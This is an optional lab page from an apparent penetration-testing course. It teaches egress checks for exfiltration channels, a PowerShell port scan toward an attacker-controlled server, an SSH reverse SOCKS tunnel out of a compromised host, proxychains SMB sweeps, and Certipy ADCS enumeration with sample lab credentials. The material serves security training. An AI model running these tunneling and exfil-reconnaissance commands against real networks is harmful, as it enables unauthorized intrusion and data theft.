# Optional - Operator Techniques

???+ warning "Prerequisites"
    These techniques are **supplemental** and not required for course completion. They represent advanced real-world attack patterns used during penetration testing engagements.

    Recommended prior knowledge:

    - Basic understanding of network pivoting and compromised host access
    - Familiarity with SSH and command-line tools
    - Completion of the **Pivot and Escalate** lab

## Intro

This optional lab covers additional operator techniques that go beyond the core curriculum. These are practical skills used during real-world engagements when you need to:

- **Test egress controls** before establishing C2 or exfiltrating data
- **Tunnel traffic** through compromised hosts to reach internal networks
- **Exploit certificate services** for privilege escalation

Each section is self-contained - you can explore them in any order based on your interests.

---

## Egress Testing

Before pivoting externally or establishing C2, smart operators check what egress is allowed. From a compromised host, test:

| Check | Why It Matters |
|-------|----------------|
| **Pastebin access** | Data exfiltration potential |
| **Google login** | OAuth abuse, token theft |
| **GitHub access** | Tool staging, PowerShell download cradles |
| **External HTTP server** | File transfer via `python -m http.server` |

### Quick Connectivity Checks

```bash
# Quick connectivity checks from compromised host
curl -s https://pastebin.com > /dev/null && echo "Pastebin: OK" || echo "Pastebin: BLOCKED"
curl -s https://github.com > /dev/null && echo "GitHub: OK" || echo "GitHub: BLOCKED"
curl -s https://raw.githubusercontent.com > /dev/null && echo "GitHub Raw: OK" || echo "GitHub Raw: BLOCKED"
```

???+ tip "Why This Matters"
    Content filtering and egress controls vary widely. Knowing what's allowed helps you choose appropriate exfil channels, tool staging methods, and C2 protocols.

### Egress Port Scanning (PowerShell)

For a more comprehensive egress check, scan all TCP ports from a Windows host to an external server you control. The external server should be configured to respond as open on all ports (e.g., using `socat` or a similar listener).

```powershell
1..65535 | % {$test=new-object system.Net.Sockets.TcpClient; $wait = $test.beginConnect("YOUR_EGRESS_TEST_SERVER",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo "$_ open"}else{echo "$_ closed"}} | select-string " " | Out-File -Encoding ascii tcp-port-status.txt
get-content .\tcp-port-status.txt | select-string "open" | measure-object -Line
```

???- note "Command Options/Arguments Explained"
    - `1..65535`: Iterate through all TCP ports
    - `TcpClient.beginConnect`: Asynchronous connection attempt to each port
    - `waitone(250,$false)`: 250ms timeout per port
    - `YOUR_EGRESS_TEST_SERVER`: Replace with your external server configured to accept all ports
    - Output: Creates `tcp-port-status.txt` with open/closed status, then counts open ports
    - **Setup required**: Your external server must respond on all ports for accurate results (e.g., `socat` listening on all ports)

???+ warning "Time Warning"
    This scan takes a while to complete (65,535 ports at 250ms each = ~4.5 hours worst case). Consider scanning common egress ports first (80, 443, 8080, 8443) or running in the background.

---

## SSH Reverse Tunneling

When you need to route attack tools through a compromised host to reach internal networks, SSH reverse tunneling creates a SOCKS proxy.

### Setting Up the Tunnel

```bash
ssh -i ~/.ssh/pivot -R 9050 root@YOUR_EXTERNAL_IP
```

???- note "Command Options/Arguments Explained"
    - `-i ~/.ssh/pivot`: SSH private key for authentication
    - `-R 9050`: Create a reverse SOCKS proxy on port 9050 on the remote server
    - `root@YOUR_EXTERNAL_IP`: Your external attack infrastructure
    - What happens: Traffic sent to port 9050 on your external server gets tunneled through the SSH connection and exits from the compromised host

### Configuring Proxychains

Configure proxychains to use the tunnel:

```bash
# Edit /etc/proxychains.conf
# Add at the bottom:
socks5 127.0.0.1 9050
```

Then run tools through the tunnel:

```bash
proxychains nxc smb 10.10.10.0/24 -u user -p password
```

???+ tip "Real-World Use Case"
    You've compromised a workstation that can reach internal servers your attack box can't. SSH tunnel lets you run Impacket, NetExec, etc. from your machine while the traffic exits from the compromised host.

---

## Certipy - AD Certificate Services

???+ info "Exploration Only"
    ADCS attacks require the `essos.local` domain which isn't part of the core class VMs. This section is for students who want to explore on their own.

Active Directory Certificate Services (ADCS) is frequently misconfigured, leading to privilege escalation paths known as ESC1-ESC8.

### Enumeration

**Sample enumeration command**:

```bash
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
```

???- note "Command Options/Arguments Explained"
    - `certipy find`: Enumerate certificate templates and CA configurations
    - `-u khal.drogo@essos.local`: Domain credentials for authentication
    - `-dc-ip 192.168.56.12`: Domain controller for the essos.local domain
    - Output: JSON/text report identifying vulnerable certificate templates

### Common ADCS Escalation Paths

- **ESC1**: Misconfigured certificate templates allowing arbitrary SANs
- **ESC4**: Vulnerable template ACLs allowing modification
- **ESC8**: NTLM relay to AD CS HTTP endpoints

For more information, see the [Certipy documentation](https://github.com/ly4k/Certipy).

---

## Key Takeaways

| Technique | When to Use |
|-----------|-------------|
| **Egress Testing** | Before establishing C2 or exfiltrating data - understand what's allowed out |
| **SSH Tunneling** | When your attack box can't reach internal targets but a compromised host can |
| **Certipy/ADCS** | When you need privilege escalation paths in environments with AD Certificate Services |

These techniques complement the core pivoting and escalation skills covered in the main labs. Practice them in lab environments before using on real engagements.

## What's Next?

Explore other optional labs:

- **AD Miner** - Prettier Active Directory vulnerability assessment
- **Bonus VMs** - Additional GOAD environment systems for self-directed practice

Or revisit the core labs to reinforce your skills.
